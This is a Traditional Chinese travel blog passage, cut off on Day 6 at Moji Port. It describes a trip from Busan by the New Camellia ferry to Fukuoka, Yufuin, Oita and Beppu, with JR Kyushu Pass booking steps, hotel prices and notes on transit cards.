特急跟一般票是分開的，買完一般要加買特急才能搭特急；直接搭會被要求補票。(JR Pass 就不用管，可無腦搭乘) JR 特急幾乎 100% 會遇到查票，搭自由座的話車長會多問你要去哪，方便紀錄 JR Pass 有線上提前預約的話 (需刷信用卡支付劃位費用)，兌換 JR Pass 時會需要出示同一張信用卡進行驗證，所以務必要帶那張卡去日本 ⚠️ 新山茶花號太晚訂就只有經濟通鋪 (8–11 人男女混睡、只有日式公共澡堂、晚上 11 點熄燈) 由布院之森太晚訂沒位子，只能搭一般的由布 JR 高千穗峽谷划船需要提早預訂 JR Pass 有兩班新幹線不能搭乘： 「希望(Nozomi)號」、「瑞穗(Mizuho)號」，要另外買票 JR Pass 進出博多站的新幹線票口有時候會卡住，需要走人工(因為上述兩班不能搭乘，只要確認你不是搭這兩班，站務人員就會放行) 訂票都要確認一下，這次遇到訂新山茶花號的時候性別出錯，當天趕快聯絡客服協助修正。 ⚠️(後來發現是男女混住應該沒差，但還是嚇了一大跳) 九州公車不一定準時、Google Map 指示也不一定準確 日本行李寄物 Coin Lockers 查詢、預約 ( 但不是所有，很多可寄物的地方上面沒有 ) 韓國要轉接頭 韓幣只能臨櫃換 韓國可以只買 tmoney 交通卡，不需 WowpassKKday 推廣 日本 JR PASS｜九州地區鐵路周遊券｜北九州＆南九州＆全九州｜電子票 日本長崎|九州豪斯登堡門票 Huis Ten Bosch 日本福岡|博多港ー釜山港・客貨郵輪「新山茶花號」Camellia Line 日本eSIM卡｜每日高速、總量、無限流量吃到飽方案 福岡西鐵｜太宰府 天滿宮+柳川遊船 觀光暢遊套票｜福岡機場國際線領取 日本福岡teamLab Forest 福岡門票 — SBI 證券｜立即確認 【一人成團】日本九州一日遊｜高千穗峽＆天岩戸神社＆天安河原（含特色阿蘇赤牛烤肉套餐）｜福岡出發 九州熊本一日遊｜阿蘇中岳火山・草千里・熊本城・水前寺成趣園／季節水果吃到飽｜福岡博多出發（中英日對應）準備工作樂此行主要是去踩 韓國釜山到日本福岡(博多)的新山茶花號郵輪 跟由布院(湯布院)、大分別府、宮崎縣-高千穗。行前計畫如下：(出發前一天才規劃好， 實際順序不一定照計劃 、南阿蘇太遠後來沒去) 6/3 約 19:00 抵達釜山-金海機場，20:00 到釜山站、飯店 Check-in 附近覓食 6/4 海東龍宮寺、海雲台、晚上出境韓國、搭 新山茶花號郵輪 6/5 抵達福岡、去唐津往上去七釜、往下去祐德稻荷神社、大魚神社海中鳥居、回程經 Lalaport實際：只去祐德稻荷神社 6/6 早上搭成 JR 前往由布院、下午前往大分 6/7 大分、別府地獄之旅 6/8 門司、下關、唐戶市場實際：多去唐津城 6/9 南阿蘇、白川水源、上色見熊野座神社實際：改去佐世保(九十九島遊覽船)、武雄溫泉 6/10 看 6/7 遺漏的行程，大魚神社海中鳥居、祐德稻荷神社、Lalaport or 逛街實際：去櫻井二見浦 夫婦岩、南藏院、博多巡禮 6/11 KKDAY 高千穗一日遊 ，高千穗神社、高千穗峽谷、天岩戸神社、天安河原 6/12 佐世保、九十九島、豪斯登堡 or 棒球實際：去博多逛街、天神逛街、PayPay Dome 看棒球 6/13 福岡市區逛街、晚上搭 21:00 飛機回台灣實際：多去 Lalaport網路這次一樣買 DJB ，韓國 2日 2GB、日本 9 日吃到飽，總計 NT$1,250。高千穗因為從福岡去交通極其困難，因此直接報名 KKDAY 高千穗一日遊 ，包車包午餐包中文導遊，價格 NT$2, 272/人。行✈️ 航班 去程：華航 台北桃園 TPE 15:55 -&gt; 韓國釜山金海國際機場 PUS 18:55 回程：華航 日本福岡機場 FUK 21:00 -&gt; 台北桃園 TPE 22:25 來回含托運(23公斤/件)價格：NT$10,480🛳️郵輪 新山茶花號 出發：18:30 報到 釜山港國際航運總站 抵達：07:30 博多港國際航運總站價格： 經濟/2等室:共乘艙 NT$1,450/人🚅 JR Pass 北九州鐵路周遊券(5 日)價格：NT$3,042 這次在九州使用 JR Pass 能搭特急就搭特急，除了由布有特別劃位，其他都是直接去自由席車廂坐(人不多、都有位子)。由 布院之森 博多往由布院沒預定到，只能預定 由布 1 的位子。請注意由 布院之森 跟 一般列車(由布 X) 不一樣，預約時要注意是不是預約 由布院之森 。預訂方式： 先買完 JR Pass 才能預訂，因預定旅行社選項只有 KLOOK，怕其他機構無法訂位 (頁面是說 非上述旅行社發行的MCO的客人,請不要做任何選擇。 應該也可以) ，所以我從 KLOOK 買 JR Pass 的。1.進入 JR Pass 預定首頁：滾動到下方找到「鐵路周遊券購買」-&gt;「查詢/更改/退款」2.進入 JR Pass 預訂頁面 ：選擇「登記」閱讀並同意條款，點擊「前往下一頁」輸入你想註冊的電子郵件，點擊「登記」。到信箱中收信，記下「temporary password」並點擊繼續連結。1.旅行社名稱選擇：KLOOK 有非上述旅行社發行的MCO的客人，請不要做任何選擇。2.KRP預約號碼/MCO號碼進入 KLOOK 查看 JR Pass 憑證，複製貼上以下憑證號。3.姓名輸入 JR Pass 訂單姓名，依據說明如為 KLOOK 發行的憑證要輸入的是名＋姓，因此我憑證是寫 LI ZXXX CXXX 但這邊要填寫 ZXXX CXXX LI 。 請輸入在JR Kyushu Rail Pass Online Booking購買JR九州鐵路周遊券時登記的姓名，或旅行社發行的兌換證 （eMCO、MCO）上標記的姓名。 利用KLOOK發行的憑證的客人，請“名”和“姓”的順序輸入您的名字。4.輸入信中的 temporary password 暫時密碼5.6. 輸入你想要設定登入的密碼完成密碼設定後，在可預約時間( 日本時間 05:30~23:00 可接受預約 )就能回首頁查詢、預約列車對號座； 時間外無法預約 。 出發日 出發站：博多 抵達站：由布院由布院之森 已滿，只能預約一般列車 由布 1 ，最早的班次 07:43 出發，10:03 抵達。 繼續下一頁選擇座位偏好、位置、車廂。輸入周遊券開始使用日。輸入信用卡資訊支付訂位費用 (成人 1,000 / 兒童 500 日圓一人)。 上述為購買人的信用卡。在窗口領票時，必須攜帶並出示購買時使用於結帳的信用卡。 上述為購買人的信用卡。在窗口領票時，必須攜帶並出示購買時使用於結帳的信用卡。 上述為購買人的信用卡。在窗口領票時，必須攜帶並出示購買時使用於結帳的信用卡。 ⚠️所以請務必攜帶該信用卡前往領票 ⚠️結帳，預約完成！住 (10晚，其中 1 晚在郵輪上) [6/3] 東橫INN 釜山站1號店 (1晚) 地點很好就在釜山站外，往後走就是釜山港國際航運總站，來去都方便。價格：NT$1,940 兩人雙床房 [6/4] 新山茶花號 (1晚) 價格：NT$1,450/人 [6/5] 東橫INN 博多口站前 (1晚) 博多站出來走大概 10 分鐘會到。價格：NT$2,911 兩人雙床房 [6/6, 6/7] 東橫INN 大分站前 (2晚) 大分站出來走大概 10 分鐘會到。價格：NT$4,389 兩人雙床房 [6/8, 6/9] APA Hotel Fukuoka-Watanabedori EXCELLENT (福岡渡辺通駅前) (2晚) 渡辺通站出來走大概 5 分鐘會到。價格：NT$9,311 兩人雙床房 [6/10, 6/11, 6/12] 東橫INN 福岡天神 (3晚) 天神南站出來走大概 10 分鐘會到。價格：NT$7,131 兩人雙床房總計：$14,291，平均 1 晚 $1,400，這次終於達成壓在 1 晚 $1,500 以內了， 感謝東橫 INN ！ 另外，東橫 INN 辦會員可以 3 點 Check-In+住 10 晚送 1 晚+提早半年預定+5% 折扣+ 直接用卡 Check-in …等等優惠。 上次去 廣島 的入住東橫 INN 的時候，順便辦會員了，只要在入住的時候跟櫃台說要辦理會員，簡單填一下資料、 支付入會費用(一次性) 1,500 日圓 ，現場拍照現場發卡，以後就能使用了。韓國要使用 Naver Map ，可以預先安排好行程跟路線，方便查看： 我覺得以旅遊地圖來說，比 Google Map 好用！ 可直接使用 Line 登入Go! Flight Tracker、iPhone Suica 使用、Visit Japan 預入境申請…之前文章有提過，這篇就不多贅述了。Visit Japn 目前改成二合一了，入境跟海關用同一個 QRCode。Day 1 出發如同 前幾次出國 ，到機捷台北車站 A1 的時候先去辦理預辦登機，這樣去機場就能直接出境。( 可預辦登機的航班、規定請參考官方網站 )。 本來想說橘線搭去三重轉機捷，但機捷另一個預辦登機站是在 A3 新北產業園區站，不是三重站 ，而且三重站沒有直達車，所以還是到北車再換了。 同之前出國會在行李箱放一個 Airtag 方便追蹤桃園機場 TPE 第一航廈這次華航飛釜山是在第一航廈。到機場先找櫃檯換匯韓幣，外匯提款機幾乎都不提供韓幣只能換日幣； 機場匯率不好並且要收 NT$100 手續費 ，因此有時間的話還是建議在銀行提早櫃檯提早換匯。13:00 出境約莫 13:00 就完成出境手續了。第一航廈出境買個頂呱呱炸雞當午餐。之前 路過景觀休憩區都是關閉狀態，這次有開放上去看看，沒想到就這樣，很小。因為時間還太早，這次就有來一航的免費貴賓室休息區休息了，這時間沒什麼人。頂呱呱炸雞有醃過，很好吃，可惜機場這家不供應呱呱包；另外 發現這邊充電座都被拿掉了，只剩外殼，無法充電 。裡面衛浴兼廁所，數量不多(目測約五間)，很乾淨高級，清潔人員打掃的也很即時。15:20 開始登機約莫 15:20 開始登機。一航 BR 航站樓需轉乘交通車到登機口，往釜山這個航班沒什麼人啊！如圖，目測不到 30 人。這班華航飛釜山的是 737–800 中型飛機，沒有娛樂螢幕，Bye Taiwan!。只能靠機上 Wifi 連接娛樂內容，電影蠻多的！有賽道狂人！飛機餐是三杯雞麵(蠻難吃的)，沒想到 華航 x 五桐號 x Dinotaeng Quokka 的聯名還有，獲得短尾袋鼠小點心。撰寫入境卡、報關卡、 檢疫 QRCode 可預先申請 ，未申請要多寫一張檢疫卡。19:05 抵達韓國釜山金海國際機場 PUS韓國白天溫度大約 20–25 度，晚上可能低於 20 度；有點像台灣的秋天季節。19:20 出機場 KKday 韓國釜山通行證 VISIT BUSAN PASS大約 19:20 就入境＋拿完行李出機場。當時誤會 wowpass 跟 tmoney 的關係，以為只有兩個合再一起的卡；我自己的認知是 wowpass 是包含儲值換匯提領購物的現金卡、tmoney 是交通卡，wowpass 會包含 tmoney； 實際只要買 tmoney 不需要 wowpass ，那時候沒搞清楚，一直在找 wowpass 而非 tmoney， 釜山國際機場沒有 wowpass 機器 ，因此先靠現金買車票一路坐到釜山。從金海機場到釜山站，地鐵一共要轉三次車；搭下來人沒有很多，不怕擁擠。 如果有交通卡可以直接刷卡進 第一段票 紫線釜山金海輕軌 從 機場站 到 沙上站 按照地板指示前往月台 紫線到 沙上站 後下車按照指示往綠線移動 綠線 2 號線 坐到 西面站 買第二段票到 西面站 綠線 坐到 西面站 後下車，一路朝 橘線 月台前進 橘線 1 號線 坐到 釜山站 下車 綠線到橘線轉乘不需要進出月台，不確定當時在綠線買票能不能買到 釜山站，那時候沒仔細看；因此在釜山站出站出不去，需要人工補票才出去。20:20 抵達釜山站出站就是東橫 INN 釜山站 1 號店。放好行李出來覓食。 還好飯店有 100V 台灣的插座/USB 插座，不需要轉接頭就能使用。因為時間晚，附近的燒肉都關門了；隨便找了家豬肉湯飯餐廳解決 ( The Doi Jongga Dwaejigukbap Busan Stn. )。 豬肉湯飯，豬味很重，湯油但不濃，配飯吃還可以 豬頸肉烤盤，夾生菜、泡菜吃不錯，但吃太多會很膩 兩份湯飯＋豬頸肉一盤 一共 46,000 韓幣。Wowpass / Tmoney飯店大廳就有 wowpass 機器，掃描護照按照指示跑完流程，機器就會吐出 wowpass+tmoney 二合一卡。 上半部是 Wowpass 晶片是 Wowpass Wowpass 儲值跟 Tmoney 是分開的 Wowpass 可透過 Wowpass 機器儲值、直接用台幣儲值、線上信用卡儲值、換匯、提領(要手續費) Wowpass 有期限 ，太久沒用可能會導致金額消失 晶片部分可在商家刷卡使用 Tmoney 可以在超商或是地鐵加值機儲值 暫時無法從 Wowpass 入金 Tmoney (官方說未來可以) Wowpass 發卡要入金 5,000 韓幣，但這步好像可以跳過，跳過等於免費發卡？ 下半部是 Tmoney，搭乘地鐵、公車時記得用下半部版應；我第一次用整張感應一直失敗，貌似感應到 Wowpass。 拿到實體卡後就可以在 Wowpass App 進行綁定 Wowpass App 可查看 Wowpass 餘額 Tmoney 餘額需要靠卡感應才能知道 (好特別！) 如上圖，Wowpass 餘額 454 KRW / Tmoney 餘額 2,500 KRW如果想知道 tmoney 儲值、扣款細節需要另外裝 App (BucaCheck) ： 一樣是靠卡感應讀取內容 如本篇遊記對您有幫助，可以在 Wowpass 註冊時輸入我的邀請碼： 373TBH87晚餐吃完去 GS 25 買韓啤跟韓國小零食吃，Kelly 好喝、右邊這個像辣條但沒那麼鹹跟辣，下酒很適合、蟹味餅乾普普。休息，結束奔波的 Day 1。Day 2 海東龍宮寺、海雲台、搭新山茶花號郵輪海東龍宮寺一早從釜山站公車站搭乘 1001 公車前往海東龍宮寺；班次多、人不多。路程稍遠，約需 1 個半小時，韓國公車跟台灣差不多，司機開的蠻猛的；正常是前上後下，但也有人前下後上。下車點對面就是 Skyline Luge 釜山 。下車往前走就能看到海東龍宮寺的指標了，右轉走一段山坡路就能抵達；地圖寫走 15 分鐘，但因為是山坡路大概要走 30 分鐘左右，不想走路也可以搭計程車。會先經過一條商店街、附近也有類似貨櫃市集的地方可以小憩吃點東西，進來可以看到一排 12 生肖代表、(狗)戌年。再往前走就能看到海東龍宮寺的牌樓，色彩非常豐富有特色。一路下坡到海東龍宮寺本院，整排樓梯要小心走。可以先去左邊的觀海平台鳥瞰整個寺院。走進大雄寶殿，外面可以買瓦片寫上自己的願望 (10,000 KRW)。海雲台從海東龍宮寺外公車站再次搭乘 1001 往回到海雲台 (約 1 小時)。當天豔陽高照，海灘有沙雕展覽。 下階梯要小心，親眼目睹一個韓國大叔踩空摔倒到沙堆中(還好是沙堆)。ㄏ海雲台 LCT ，釜山標誌性建築。HAEUNDAE 海雲台，晴空萬里。海雲台海水浴場有救生員、有拉紅線範圍，也可以安排水上活動。午餐吃了海雲台周邊的韓國燒肉 Baegnyeon Sikdang ，都是店員代烤；點了份韓牛外脊跟豬頸肉，都很好吃，還有一份石鍋飯，鍋巴米香味很濃；兩個人分著吃。另外點了韓啤、韓國燒酒喝個痛快。（忘了試看看燒啤） 價格 13.0 代表 13 * 1000 = 13,000 KRW 一樣有一堆韓式小菜，都是醃漬物、泡菜、生醃螃蟹(應該是生吃但很腥，我不敢) 店員人不錯、英文也還算通旁邊就是 海雲台傳統市場，主要是賣當地海鮮，買了支冰淇淋走了一圈，又去另外一家賣冰淇淋可頌的店，吃了一個某茶冰淇淋可頌（外堅內軟，好吃！）。吃飽就忘記海雲台還有個單軌列車可坐還有海雲台 LCT 其實也可以上去看看 (當初排行程沒太認真查釜山行程)，此時約莫 14:00，就搭 1001 公車回釜山站了，想說回去再看要去哪或釜山站逛逛。回到釜山站大概才 15:00，離郵輪報到時間 18:30 還很久，回釜山才發現釜山站沒地方可逛(貌似沒有百貨公司或商店街、景點之類的)；要去甘川文化村又怕太遠，只查到釜山站往下幾站可以去釜山塔、周邊有百貨公司、商店街。 本來要去釜山塔結果出錯地鐵站走了很遠，放棄返回。 KKday 韓國釜山|龍頭山公園釜山塔展望台電子門票 。 要去釜山塔要從 南浦站 下車，並從 1 號或 3 號出口到光復路時尚街搭手扶梯上龍頭山公園，千萬別繞遠路走上山。買了韓國有名的香蕉牛奶喝。17:00 前往 釜山港國際航運總站大概在釜山站附近亂晃到快五點就去飯店拿行李前往 釜山港國際航運總站 了。進入釜山站大廳 (2樓)，找到 10 號出口，一路走天橋就能到 釜山港國際航運總站 (約需走 15 分鐘)。 千萬不要走平面道路，有很多很多大型車輛，很危險。白天的釜山港大橋。釜山港國際航運總站(碼頭)裡面空蕩蕩，沒什麼人，因為每日航班也很少；除了往福岡博多還有郵輪往下關、對馬島、大阪、熊本…等。從大廳上到 3F 出境，先去 New Camellia 兌換船票。(需要護照)約 17:30 就開始候船了，等候出境廳很大； 其實可以四處晃晃、買吃的帶上船去吃的 。要注意的事是： 博多港 無法 使用電子通關，所以請務必填寫入境卡跟報關卡⚠️ 可以攜帶食物跟水，也不用放在行李箱，因為根本不用托運，行李箱隨人上船。 只有手持飲料不行 整個出境非常快，過安檢也是意思意思而已(所有東西過 X 光)18:30 開放出境。出境後候船空間不大，有幾家免稅店跟咖啡廳(只有這家有賣吃的)，買了一個鮪魚三明治裹裹腹。去免稅店買了一些 韓國 Toms Gilim 杏仁果 (經典蜂蜜口味、裹草莓巧克力、提拉米蘇味)當伴手禮。出境後可以先用行李排隊，大家也都是用行李箱排好隊，準備搭船。韓國人大概佔了 90%。可以從窗邊看釜山港，時間快到的時候大家就會回到各自的行李旁邊準備上船了。從碼頭到上船大概還需要走跟等待個 15–20 分鐘。新山茶花號Room 430，登船後上到 4 樓 430 間。空間很小，最多可以住到 11 人，這次是一組家庭 (3人) + 兩對夫妻 (4 人) + 我跟我朋友 (2 人)，沒住滿； 貌似是會把同語言、國家的人安排在一起(這房除一對夫妻是港澳人其餘都是台灣人) 。 每個人空間小、枕頭很硬、簡單床墊、新的床單、被子 先來先到，剛好卡到角落位置，稍微大一點 有兩個插座(不用轉接頭)，可以輪流充電行李安頓好大約 20:00，船大約 10:30 才會開始離港。3 樓是餐廳跟小賣部、自動販賣機(均 使用日幣 )，有賣拖鞋、盥洗用具、衛生用品；餐廳沒有供應，只能買小賣部泡麵或自動販賣機的微波食品； 因此建議是從釜山帶吃的上來 。 要注意：肉類製品不能攜入日本，沒吃完的要丟掉。 ⚠️好在登船前有吃一個三明治，沒有很餓，隨便買個泡麵解決一頓。 要注意：熱水不在餐廳那邊，餐廳那邊只有冷水機；熱水要到客艙間靠船尾那邊的 給湯室 才有，我找好久才找到。 另外熱水器要小心操作，先轉開開關，不會馬上出水，要等待一下，出水後小心接用，用完請確定關緊，避免燙到下一個人。吃飽後出甲板晃晃(可以自由進出，小心地滑)。約 21:00 另一艘往下關市的郵輪(PUKWAN FERRY)會先出發。回頭看釜山港碼頭夜景。大約 22:30 船就會開始駛離釜山港，經過釜山港大橋，出來看橋的夜景非常美。(會冷，注意保暖)通鋪經濟艙 11 點就會統一熄燈，看完出港差不多就可以回來躺平了。 只有特等室有個人的獨立衛浴，其他為共用 浴室是日本的公共大浴場，需全裸，洗澡的地方有小隔板；因為沒膽去就沒洗澡了。 整體設施蠻舊的，不過保持的乾淨 有娛樂室、KTV 公共空間不會熄燈 網路至少離港到 11 點多都還連得上 (據說是只有一小段可能沒網路) 接近對馬島就進入日本境內了，要換成日本 SIM 卡 行駛中會微微起伏晃動，很容易暈船的可能要吃暈船藥晚安，釜山。Day 3 博多、祐德稻荷神社大約清晨 5:30 左右就抵達釜山、通鋪統一開燈 ；出甲板看清晨的博多港與博多港塔，很寧靜。有加購早餐的可以去餐廳用餐，我們沒有，就慢慢盥洗、甲板亂晃、收拾東西準備下船。 統一於 07:30 開放下船，大家一樣會用行李在 3F 大廳出口排隊。約 08:00 完成入境日本、出博多港國際航運總站 再次提醒 博多港 無法 使用電子通關，所以請務必填寫入境卡跟報關卡 ⚠️一出來就有公車往博多站或天神地區。 雖然大件行李搭公車不方便，不過因為這是發車站，所以一定有位子，大多數人也都帶行李，比較不尷尬 中間停靠站會有一些人上車，人不多，所以還好 平日早上回博多搭地鐵人也沒有很多，不怕尷尬 (九州就是空曠！)約 9:30 飯店放完行李、博多站百貨公司美食街吃個 朝の貝汁定食 早餐填飽肚子、領 JR Pass &amp; 明日早上去由布院的車票 JR 九州 Pass 目前還是只能人工櫃檯兌換，請提早去排隊兌換，如果博多站太多人可以 考慮去附近的其他車站兌換，會比較快！祐德稻荷神社原本預計是去唐津城，查了下 JR 特急班次，去祐德稻荷神社比較快跟近加上昨日的勞累，決定更改行程。從博多搭乘前往 鹿島市 - 肥前鹿島站。出站後往左手邊馬路走，到對面 2 號等車。 這邊跟 Google Map 指示不一樣，Google Map 要我走到中牟田站等車，約 500 公尺遠。 請注意我是 2024/06 去的，站台可能因時間有所調整。祐德稻荷神社在祐德神社前下車後，往後走就是表參道。不知道是不是因為平日表參道、商店街幾乎沒人也沒幾家有開。一路走到底(約 15 分鐘)，就是神社。神社入口，後方玻璃建築是電梯，不想走上去可以 付費搭乘電梯 。往上走會有整排的祈福風鈴，去的時候都沒人，經過風鈴時剛好一陣風，響徹咣當。一路穿過整排鳥居、美麗盛開的繡球花，後面可以在登山往上到奧之院(約 200M，很陡不好走)。參拜完就回到車站，一路回 JR。比較了一下 大魚神社海中鳥居 跟 唐津城，感覺海中鳥居普普通通（ 畢竟見識過嚴島神社的海上大鳥居 ）並且交通很麻煩，因此預計前往唐津。再換車的時候出錯了，這是小站無任何電子看板，一下車看到月台寫「唐津方面」就以為在此月台換車，結果時間到了車從另一個月台通過，來不及上車。後面仔細研究了一下才發現要看時刻表的右下角框框才是正確的候車月台，平日假日的月台也不一定相同。因為錯過往唐津的列車，也回不去大魚神社海中鳥居，加上昨日的狼狽，所幸決定直接回博多飯店休息。 回程也發現一個新奇的事，一路上想說小站怎麼列車不開車門(我坐在後面車廂)；仔細觀察才發現，連站務員都沒有的小站，車長就是站務員，要下車要從第一節車廂下車，並且按照螢幕投幣車資或刷交通卡(跟公車一樣)，如果用 JR Pass 只需要向司機出示即可。 另外也再次提醒，如果是在無人的 JR 出站，使用 JR Pass 就直接走出去就好，千萬不要把 JR Pass 投到車票回收箱了。 ⚠️約 16:00 回到博多、飯店 要注意東橫 INN 的洗衣機可能是沒有洗劑的，清洗前請先確認是否是自動投入洗劑的洗衣機⚠️ 如果不是，要另外投幣或跟櫃台買洗劑。(30 日圓)把衣服投入洗衣機後就去博多站百貨公司地下街覓食了。買了一個牛排便當回來吃，很讚；茶酒還好，沒什麼味道。另外買了養樂多 1000 晚上喝、BRULEE 焦糖冰淇淋當甜點(好甜！)、海老炸蝦當宵夜(這次買到真的是整隻炸蝦的了，之前在 熊本買到假的 QQ)。洗衣(30 mins)、烘衣(1 hr)、休息。Day 4 由布院、大分 參考行程：KKday 日本九州福岡大分一日遊|太宰府天滿宮・由布院(湯布院)・別府海地獄&amp;灶地獄(竈地獄) |博多出發(中英日對應)一早 Check-out 拖著行李前往 JR 博多站搭 由布 1 前往由布院。 行李箱可放在行李間，如果怕滑動可以放橫著。 一杯咖啡醒醒腦 這季節綠油油的一路上沒特別好看的風景(或由布院之森才有景？)一抵達由布院站出站後立刻右轉前往 Coin Lockers 寄物櫃寄放行李，因為是行李箱所以位置比較少。(1,000 日圓)可能因季節跟天氣關係，去的時候覺得整體色調灰、綠油油，沒有特別有感覺。沿著街道一路走到底就是金鱗湖，綠油油的湖畔透露著一絲寧靜。金鱗湖非常乾淨清澈，湖邊有許多楓葉(尚未變色)。從由布院車站一路到金鱗湖的街道上有非常多的 IP、文創小店可以逛，對美食有興趣的也可以查一下由布院金賞甜點，有布丁、冰淇淋…等等當然也少不了四處可見的龍貓之森、吉伊卡哇、還有「九州特產」熊本熊。湯布院昭和館很有日式傳統感。花卉村看起來太觀光、人很多，就沒特別進去看了。在路上買了有名的布丁銅鑼燒跟一些伴手禮(胡麻粉、由布院煉瓦工場 — 七大福、文創小物、線香由布院香…) 小插曲：居然這由布院這世外桃源還能遇到同事 XD — Pinkoi 社群一姊午餐本來要吃 由布まぶし 心 有名的由布院釜飯，有兩家一家在金鱗湖本店一家在車站出口，當天車站出口那家休息，我們也懶得再走回本店了，於是改吃 1 樓的 鮨 源 。我吃的是豐後牛牛排、我朋友吃的是丼飯；牛很好吃，很香很 Juice 並且沒什麼腥味，價格也便宜。吃完再逛一下時間大約來到 15:00 就搭車繼續往大分前進了。由布院往大分班次蠻多、人也很少(可能比較多人是回博多？)也有區間車，這次就直接搭區間車去，順便練習了新學到的日文：この電車は大分に行きますか。はい、大分に行きます。16:20 大分剛好遇到大分站有佈置裝置藝術（他還會發出聲音）。大分整個給人一種遠離喧囂的氛圍，在市區閒晃的時候覺得異常的安靜，只有淡淡的汽車引擎聲，沒什麼人、車的聲音。先去飯店寄放行李，東橫 INN 格局都差不多，剛好排到跟昨天博多站前一模一樣格局、角度的房型，差別在於這家的廁所比較大、走道比較小。時間還很早，想說去周圍晃晃，隨手打開 Google Map 看看附近的景點。巨大ブーゲンビリア往大分城址的路上公園停車場有一個巨大九重葛(很像咒術迴戰的什麼詛咒)。大分城址大分城址只剩下護城河、城牆、庭院，裡面是一個空曠的停車場跟天守閣台地，可以眺望大分市。官方有提供一個 AR App 讓你看到之前大分城的樣子。一路晃晃悠悠，走回車站市場覓食，大分的公車很有年代感，但維持得很好。晚餐不知道要吃什麼，隨意買個豬排飯跟 Suntory 無酒精氣泡飲 (好喝！)；日本的醬料包很貼心的設計一個小角方便打開。宵夜是草莓冰沙冰淇淋、燒烤、麒麟期間限定鳳梨酒(鳳梨味足夠、有點甜)。Day 5 別府地獄、別府 參考行程： KKday 【別府由布院一日遊】西羅寺+別府地獄+由布院(福岡出發) 九州別府地獄溫泉巡禮|普通門票 / 預售票|現買現用從大分站到別府站搭 JR 特急約只需 15 分鐘，路上的景色有點像 廣島去吳市的感覺 。出 JR 轉搭公車前往別府地獄 — 第一個，海地獄，順序可參考上圖行程。 7 個地獄都想去，在海地獄入口買整本 7 張門票比較便宜 如果時間有限我覺得可以只去海地獄 入場只需撕掉門票一角投入箱子即可 每個地獄都有免費休憩泡腳區海地獄海地獄我覺得是最壯觀的，有著不停翻騰的蒸氣與湛藍的泉水。後方有一個台地跟小神社。另一邊的小血池也蠻特別的。出海地獄之後跟著指示走就能走到下一個鬼石坊主地獄。鬼石坊主地獄主要為泥漿噴湧地獄。出來同樣有指示牌往下一個地獄。かまど灶地獄灶地獄的牛奶池感覺很好泡。但灶地獄的特色不是泉湧，是煙霧，工作人員會拿線香跟吹風，對著溫泉的蒸氣吹就會冒出大量的煙霧，很有趣（查說明是因為線香的粒子會吸附更多水蒸氣分子造成聚集）。灶地獄另一個特色是有整排的溫泉周邊體驗，岩盤足浴、飲溫泉水(喝起來有點稠稠鹹鹹的)、泡腳、蒸臉、蒸手、蒸喉嚨(跟台灣看小兒科一樣ＸＤ)。這邊空間比較大、能體驗的項目較多，商店也有賣一些吃的，可以在此休憩。一樣出來就能看到往鬼山地獄的招牌。鬼山地獄鬼山地獄的水沸騰的更激烈，不斷地往外奔騰。園區另一邊是鱷魚園。出來照指示往下走就是白池地獄。會經過地獄溫泉博物館(咖啡廳)，可以休憩一下。白池地獄白池地獄較無特色，有一個小的熱帶魚水族館。剩下血池地獄、龍卷地獄，這兩個地獄就不在這個區域了，需要轉搭公車前往。白池地獄出來一路往下走到路口左轉，往前早到鐵輪 2 號站等車。血池地獄先去血池地獄，同海地獄的小血池，只是規模更大。往下走就是龍卷地獄。龍卷地獄龍卷地獄是間歇噴發的噴泉，約 30–40 分鐘噴發一次，一次大約會持續 6–10 分鐘，可以先來龍卷詢問工作人員(我們是工作人員主動告知協助的)，如果快噴發可以先來看，如果還要等那就先去血池地獄。噴發時的煙霧會形成龍卷，因此得名。極樂亭午餐就直接在血池地獄極樂亭解決了。吃了名物地獄極樂咖哩，喜歡日式粒粒分明的米飯配上濃稠的咖哩(微辣)，搭配烤野菜、雞肉，吃起來不膩很順口清爽。吃完查到附近還有貴船城、十字山展望台、明礬地獄、湯之花…景點。貴船城往回到鐵輪 2 公車站的路上想說去貴船城看看，城池很小，瞭望的景觀不錯，不過從公車站下車走來＋上坡走起來很累。 十字山展望台、明礬地獄、湯之花其實是在海地獄再上去；重新規劃行程的話，應該要先往上去這些景點再往下到海地獄、再一路到血池地獄、龍卷地獄，抑或是反過來先來血池、龍卷。十字山展望台回鐵輪 2 再次搭上經海地獄的公車，先前往十字山展望台，眺望別府市；太陽很大很熱，展望台只有廁所、沒有商店跟休憩區。入口處對面的山綠油油的很美。既然是夜景，早上來沒什麼好看的，很曬而已。明礬地獄往回下到明礬地獄，售票口在對面的 岡本屋布丁店 ，跟店員比要去對面就可以了。可以品嚐一個地獄蒸布丁再走。湯之花小屋就是用來乾燥溫泉得到結晶的，往上走到湯之花商店有賣這個溫泉入浴劑。湯之花小屋去湯之花小店買了一些入浴劑、面膜、乳霜當伴手禮。另外這邊有提供 Private Bath 私人浴場泡湯，如果害羞不敢去公共泡湯的朋友可以考慮來這裡。此時大約下午 16:00，準備搭公車回去市區了。別府回別府站之後，走去別府塔，路上隨手逛逛。(站前雕像、古老溫泉會館、大天狗)別府塔別府塔一樓自動販賣機買票，坐電梯上去，鳥瞰別府濱海區域的市景。從上面看街道、車，很療癒。塔內有個隕石展。 除別府塔之外，其實還可以去纜車或是新的別府-世界之塔。另外別府觀光局網站也有提供其他行程參考 ：別府觀光局網站打道回飯店休息。回飯店休息，一樣去大分站市場買晚餐，豬排便當，跟大分限定水果酒(好喝清爽、不會太甜)。甜點/宵夜是炸蝦、泡麵、白桃冰淇淋，跟茉莉花燒灼(我不愛燒灼)。Day 6 下關、唐津 KKday 行程參考：日本福岡北九州包車一日遊｜太宰府天满宫、門司港、唐戶市場、關門海峽、赤間神社先從大分到小倉再去門司港、下關， 下關和唐津距離約 140 公里，正常人是不會這樣跑行程的 ；因為第一天到日本的時候搭錯車沒去到唐津，很想踩這個點，所以才硬著頭皮行軍式的一日下唐。起床時間晚，大概 8:40 從大分搭乘 JR 特急先前往小倉，預計是在小倉寄放行李，再搭支線前往門司港。大分的天空開始下起小雨，想了一下我去過的每座城市都遇過下雨。( 雨神無誤 )大約 10 點多到小倉站，繞了好久，所有 自助的 行李寄物櫃 都滿了(據朋友說他 9 點來還有位子)，人工櫃檯寄物 11 點才營業，只能拖著行李先直接去門司港再找看看了。門司港出站後直接往左手邊(不用走出建築)，就是自助的 Coin Lockers，這次來門司港人蠻多的，一樣全滿；不過好在 人工寄物窗口 已經開始營業，順利完成寄物 ( 但人工這邊只營業到晚上 8 點喔！ ⚠️)。本來想說吃個 門司咖哩燒，去年來的時候都沒人，爽爽吃不用排隊 